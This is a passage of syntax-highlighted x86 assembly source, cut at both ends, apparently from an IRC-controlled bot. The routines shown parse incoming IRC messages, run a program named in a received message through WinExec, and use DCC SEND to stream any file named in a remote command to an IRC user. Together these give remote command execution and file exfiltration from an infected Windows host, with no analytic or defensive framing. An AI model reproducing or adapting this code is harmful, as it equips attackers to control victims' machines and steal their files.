        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">BuffertPtr</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">InBuffertPtr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetMsgStart</span><span class="sc0">

    </span><span class="sc5">EnoughData</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; debug code</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">InBuffertPtr</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DebugFilePtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InBuffertPtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">InBuffertPtr</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WriteBuffert</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CR</span><span class="sc0">                          </span><span class="sc1">; delete CR</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsInMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WriteBuffert</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">GetMsgReturn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

     </span><span class="sc5">GetMsgReturn</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WriteBuffert</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">WriteBuffert</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ThreadSendString</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoThreadInfoToSend</span><span class="sc0">
        
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SendMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">NoThreadInfoToSend</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetMsg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">NumToAscii</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">Buffert</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Number</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">19</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

     </span><span class="sc5">StringCreateLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">StringCreateLoop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Buffert</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">NumToAscii</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ExecuteProgram</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WinExec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SW_SHOW</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DCCSendMessage</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG $nick :"</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc3">"DCC SEND $3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SendInAscii</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SEND"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DCCSendSpaceSaver</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DCCSend</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">SendString</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCConnection</span><span class="sc4">:</span><span class="sc5">sockaddr_in</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">SockAddrTemp</span><span class="sc4">:</span><span class="sc5">sockaddr_in</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCSocket</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">FilePtr</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">ByteRead</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCTemp</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">FileName</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">DCCMemPtr</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">BytesRead</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">Port</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">


        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">TimeOut</span><span class="sc4">:</span><span class="sc5">timeval</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">readfds</span><span class="sc4">:</span><span class="sc5">fd_set</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsInMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SendString</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SendInAscii</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsInMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Space</span><span class="sc0">  
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileNotFound</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FilePtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ByteRead</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">socket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SOCK_STREAM</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCConnection.sin_family</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">DCCConnection.sin_zero</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">


        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Random</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">50200</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Port</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">htons</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCConnection.sin_port</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DCCConnection.sin_addr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DCCConnection</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">bind</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">sizeof</span><span class="sc4">(</span><span class="sc5">sockaddr_in</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ErrorDCCSend</span><span class="sc0">
        

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">SendString</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DCCSendSpaceSaver</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">NumToAscii</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HostIpAddress</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DCCSendSpaceSaver</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">NumToAscii</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Port</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DCCSendSpaceSaver</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ByteRead</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">NumToAscii</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ThreadSendString</span><span class="sc0">
   </span><span class="sc5">WaitUntilMessageQueueIsCleared</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">WaitUntilMessageQueueIsCleared</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ThreadSendString</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SendString</span><span class="sc0"> </span><span class="sc1">; let the main</span><span class="sc0">
                                                </span><span class="sc1">; thread send the message</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">listen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">readfds</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">fd_set</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.fd_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DCCSocket</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.fd_array</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TimeOut</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">timeval</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.tv_sec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.tv_usec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">select</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrorDCCSend</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">accept</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DCCSocket</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">closesocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

     </span><span class="sc5">SendLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">BytesRead</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ReadFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FilePtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">send</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SendLoop</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0">

     </span><span class="sc5">ErrorDCCSend</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">closesocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCCSocket</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FilePtr</span><span class="sc0">

     </span><span class="sc5">FileNotFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SendString</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DCCSend</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DCCSendFunction</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateString</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DCCSendMessage</span><span class="sc0">

